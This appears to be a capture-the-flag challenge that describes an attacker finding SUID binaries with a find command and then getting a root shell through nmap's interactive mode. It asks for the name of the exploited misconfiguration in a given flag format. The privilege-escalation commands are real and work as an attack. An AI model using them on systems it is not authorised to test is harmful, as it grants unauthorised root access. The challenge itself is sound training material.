## Intro:

Determine what misconfiguration was exploited. <br>
The attacker was able to take advantage of it and gain `root`. 
The attacker initially tried the following command:
```bash
find / -type f -perm -u=s 2>/dev/null
```

<br>
One of the binaries that showed in his output was `nmap`. So, his next commands were: <br> 

```bash
nmap --interactive
nmap> !sh
```
<br>

After these commands, he gained root. What system misconfiguration was exploited?<br>
Hint: the misconfiguration name 2 words long.

Flag format: **`flag{----_---}`**
